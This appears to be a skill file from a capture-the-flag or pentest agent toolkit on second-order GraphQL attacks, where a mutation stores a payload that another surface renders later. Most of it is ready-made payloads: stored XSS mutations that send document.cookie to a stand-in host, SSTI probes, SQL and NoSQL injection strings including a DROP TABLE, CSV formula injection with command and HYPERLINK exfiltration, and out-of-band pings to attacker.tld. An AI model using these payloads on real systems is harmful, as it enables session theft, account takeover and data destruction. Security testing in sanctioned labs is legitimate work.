# Second-order GraphQL — stored and deferred execution

The mutation writes a value; a *different* surface renders it later —
the write and the read are different code paths with different trust
assumptions. This is where GraphQL and `skills/web-xss/` / `skills/web-ssti/`
/`skills/web-sqli/` overlap.

---

## 1. The write→read asymmetry

```text
Mutation path:  register/updateProfile/addComment → writes to DB
                → often the ONLY schema-validated surface

Read paths:     query field reads it back   → sanitized on read? maybe
                HTML page renders it         → the XSS surface
                email renderer renders it    → SSTI surface
                PDF export renders it        → template/cmd surface
                CSV export writes it         → formula-injection surface
                log/audit trail stores it    → log-injection surface
                search indexer crawls it     → injection surface
                another service consumes it  → downstream-SSRF surface
```

The bug: the mutation validates the input for *the write*; the read path
trusts the stored value. The second-order bug lives in the gap.

## 2. Stored XSS via mutations

```graphql
mutation{ updateProfile(bio:"<script>fetch('//a.tld/'+document.cookie)</script>"){id} }
mutation{ updateProfile(bio:"<img src=x onerror=fetch('//a.tld/'+document.cookie)>"){id} }
mutation{ updateProfile(bio:"<svg onload=fetch('//a.tld/'+document.cookie)>"){id} }
mutation{ addComment(text:"<script>fetch('//a.tld/'+document.cookie)</script>"){id} }
mutation{ createPost(title:"<img src=x onerror=fetch('//a.tld/'+document.cookie)>", body:"x"){id} }
mutation{ sendMessage(to:"admin", body:"<script>fetch('//a.tld/'+document.cookie)</script>"){id} }
mutation{ submitReport(title:"<img src=x onerror=fetch('//a.tld/'+document.cookie)>"){id} }
```

Then the *read* surfaces that render it:

- The web page at `/profile` — the admin-bot visits → XSS → cookie → flag.
- The GraphQL field `{me{bio}}` — if the front-end `dangerouslySetInnerHTML`s it.
- The admin panel's comment moderation view.
- The email-notification renderer — a mutation-triggered email with your
  payload lands in the admin's mail client.
- The PDF/print export of the profile.

The mutation is the *write channel*; `skills/web-xss/` owns the payload.

## 3. Stored SSTI via mutations

```graphql
mutation{ updateProfile(bio:"{{7*7}}"){id} }
mutation{ updateProfile(bio:"<%= 7*7 %>"){id} }
mutation{ updateProfile(bio:"#{7*7}"){id} }
mutation{ updateProfile(bio:"${7*7}"){id} }
mutation{ updateProfile(bio:"{{config}}"){id} }
mutation{ updateProfile(bio:"{{self._TemplateReference__context}}"){id} }
mutation{ addComment(text:"{{7*7}}"){id} }
mutation{ createPost(title:"{{7*7}}"){id} }
```

The render happens elsewhere — a templated email, a PDF export, an RSS feed,
a rendered page. The `{me{bio}}` GraphQL read returns the *stored* string;
the HTML view renders the template.

## 4. Stored NoSQLi via update mutations

```graphql
mutation{ updateUser(id:2, input:{role:"admin"}){id} }
# → the *write* is mass-assign; the *read* is a query filter
# → chain: write a hostile value, then read it back through a filter

mutation{ updateProfile(bio:"x' OR '1'='1"){id} }
# → if the read-side does find({bio: stored.bio}) → NoSQLi via stored value

mutation{ createPost(title:"x'; DROP TABLE--"){id} }
# → admin export does `SELECT * FROM posts WHERE title = 'stored'`
```

## 5. The deferred-render pipeline

```text
mutation → stored value →
   ├─ GraphQL field renders it  (JSON string — safe-ish)
   ├─ HTML page renders it      (dangerouslySetInnerHTML — XSS)
   ├─ Email template renders it (Handlebars/Jinja — SSTI)
   ├─ PDF generator renders it  (wkhtmltopdf/chromium — HTML+JS exec)
   ├─ CSV export writes it      (=cmd|... formula — CSV injection)
   ├─ Admin panel renders it    (React/v-html — XSS)
   ├─ Log viewer renders it     (XSS into ops console)
   ├─ Search index crawls it    (Solr/ES query injection)
   ├─ Webhook fires it          (SSRF to external URL)
   └─ Another service reads it  (downstream-SSRF, deser, etc.)
```

Each arrow is a different trust boundary — the mutation's validator only
needs to fail at *one* of them for the chain to work.

## 6. Payload carriers per read surface

| Read surface | Payload shape |
|---|---|
| HTML page | `<script>`, `<img onerror>`, `<svg onload>`, `<iframe>` |
| Email (HTML) | `<img src=//a.tld/x>` (tracker-pixel exfil — no JS needed) |
| Email (template) | `{{7*7}}`, `<%= %>`, `#{ }` — SSTI markers |
| PDF renderer | `<script>` in the rendered HTML — the PDF's chromium runs it |
| CSV export | `=cmd|'/c calc'!x`, `=HYPERLINK("http://a.tld/?d="&A1)` |
| Log viewer | ANSI escapes, terminal-injection, XSS if web-based |
| Search index | `${...}` Solr/Lucene injection, ES query-DSL tricks |
| Webhook | the *stored URL* fires to attacker — write `http://a.tld/x` into a field that becomes a webhook target |

## 7. The blind trigger pattern

When the read happens in a context you can't see (admin panel, internal
export), use a *ping* payload that calls home:

```graphql
mutation{ updateProfile(bio:"<img src=http://attacker.tld/x.png>"){id} }
mutation{ updateProfile(avatar:"http://attacker.tld/x.png"){id} }
mutation{ updateSettings(homepage:"http://attacker.tld/x"){id} }
mutation{ addComment(text:"[img]http://attacker.tld/x[/img]"){id} }
mutation{ createPost(title:"x", body:"<img src=http://attacker.tld/x>"){id} }
```

`oob_listener.py serve` catches the hit — the stored payload fired on some
internal surface you couldn't see. That is the detection oracle for
second-order reachability.

## 8. The self-attack read-path

When the mutation is *for you* and the read is also *for you* (your profile
page) — still exploitable if the page has an admin viewer: another user's
payload reaches the admin view when the admin browses *your* profile.

```graphql
mutation{ updateProfile(bio:"<img src=x onerror=fetch('//a.tld/'+document.cookie)>"){id} }
# then the admin-bot visits your profile URL → the stored payload fires
```

## 9. Recording

```bash
python3 tools/state.py $CHAL --hypothesis \
  "stored XSS via updateProfile.bio — admin-bot reads /profile"
```

The second-order chain is two findings chained — the write primitive
(mass-assign or just normal write) + the render bug. Record both halves.
